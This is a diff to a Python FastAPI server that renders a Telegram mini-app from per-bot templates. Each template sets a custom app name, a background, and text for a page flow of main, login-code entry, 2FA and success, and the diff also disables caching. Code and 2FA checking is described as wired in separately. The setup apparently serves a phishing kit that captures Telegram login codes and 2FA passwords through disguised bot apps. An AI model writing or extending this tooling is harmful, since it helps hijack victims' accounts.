@@ -23,23 +23,55 @@ from fastapi.responses import HTMLResponse
 
 from database import get_bot_by_tg_id, get_template, init_db
 from directlink_service import get_module
+from miniapp_template import (
+    ALL_DEFAULTS,
+    DEFAULT_VIEW,
+    PAGE_FIELDS,
+    PAGES,
+    background_css,
+    page_field_key,
+)
 
 _MINIAPP_HTML = (Path(__file__).parent / "miniapp.html").read_text(encoding="utf-8")
 
 
 def _miniapp_config(bot_id: int) -> dict:
-    """Оформление мини-аппа из выбранного шаблона бота (для страницы)."""
-    cfg = {"color": "", "bg": "", "blur": 0, "main": "", "success": ""}
+    """Оформление и контент всех страниц (листов) мини-аппа из шаблона бота.
+
+    Отдаём страницы в порядке прохождения (Главная → Ввод кода → 2FA →
+    Успех), каждую со всеми под-полями и подстановкой дефолтов «Стандартного
+    шаблона». Мини-апп проигрывает их по кнопкам — для проверки рендера и
+    параметров; бекенд-логика (проверка кода/2FA) подключается отдельно.
+    """
+    cfg: dict = {
+        "color": "", "bg": "", "blur": 0, "view": DEFAULT_VIEW, "title": "", "pages": []
+    }
+    content: dict = {}
     bot = get_bot_by_tg_id(bot_id)
     if bot and bot.get("template_id"):
         t = get_template(bot["template_id"])
         if t:
-            c = t["content"]
-            cfg["color"] = c.get("ui_color") or ""
-            cfg["bg"] = c.get("bg") or ""
-            cfg["blur"] = int(c.get("blur") or 0)
-            cfg["main"] = c.get("page_main") or ""
-            cfg["success"] = c.get("page_success") or ""
+            content = t["content"]
+            # название приложения под шаблон (иначе — имя шаблона)
+            cfg["title"] = (content.get("app_name") or t.get("name") or "").strip()
+
+    def _val(key: str) -> str:
+        v = content.get(key)
+        if v is not None and str(v).strip():
+            return v
+        return ALL_DEFAULTS.get(key, "")
+
+    color = content.get("ui_color") or ""
+    cfg["color"] = "" if color in ("", "default") else color
+    # bg в шаблоне — id градиента / готовый градиент / URL; отдаём готовый CSS
+    cfg["bg"] = background_css(content.get("bg"))
+    cfg["blur"] = int(content.get("blur") or 0)
+    cfg["view"] = content.get("view") or DEFAULT_VIEW
+    for page in PAGES:  # порядок: main, code, twofa, success
+        pdata = {"key": page}
+        for field, _label in PAGE_FIELDS[page]:
+            pdata[field] = _val(page_field_key(page, field))
+        cfg["pages"].append(pdata)
     return cfg
 
 
@@ -58,7 +90,16 @@ def create_app() -> FastAPI:
         cfg_json = json.dumps(cfg, ensure_ascii=False).replace("<", "\\u003c")
         page = _MINIAPP_HTML.replace("__BOT_ID__", str(bot_id))
         page = page.replace("__CFG__", cfg_json)
-        return HTMLResponse(page)
+        # запрещаем кэширование: правки шаблона (вид/фон/тексты) должны быть
+        # видны сразу, без отдачи старой версии страницы из кэша вебвью/CDN
+        return HTMLResponse(
+            page,
+            headers={
+                "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0",
+                "Pragma": "no-cache",
+                "Expires": "0",
+            },
+        )
 
     get_module().mount(app)
     return app
